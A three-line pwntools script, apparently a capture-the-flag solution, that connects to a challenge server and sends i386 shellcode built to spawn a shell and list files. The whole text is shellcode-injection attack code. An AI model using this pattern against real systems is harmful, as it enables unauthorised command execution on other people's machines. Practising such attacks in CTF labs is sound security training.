from pwn import * 
r = remote('shcodeme.challenges.cfd', 5000)
r.sendline(asm(shellcraft.sh(b'ls -lah'), arch='i386'))
